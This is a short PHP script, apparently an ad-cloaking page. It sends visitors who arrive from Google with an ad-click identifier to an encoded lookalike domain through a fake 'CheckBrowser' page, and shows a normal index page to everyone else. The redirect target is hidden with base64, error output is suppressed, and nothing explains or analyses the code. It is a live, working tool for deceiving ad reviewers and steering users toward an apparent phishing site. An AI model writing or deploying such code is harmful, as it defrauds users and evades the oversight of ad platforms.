<?php
error_reporting(0);
$ref = $_SERVER['HTTP_REFERER'];
$gclid = $_GET['gclid'];
$redirLink = base64_encode('https://skinsmonkey.foo');

if (strpos($ref, 'google') !== FALSE && strlen($gclid) > 5) {
  echo '<!DOCTYPE html><html lang="en"> <head> <meta charset="UTF-8"/> <meta http-equiv="X-UA-Compatible" content="IE=edge"/> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>CheckBrowser</title> </head> <body> <script>location.href=`${atob("'.$redirLink.'")}?utm_campaign=${Date.now()}`; </script> </body></html>';
  return;
}
include 'index.html';
?>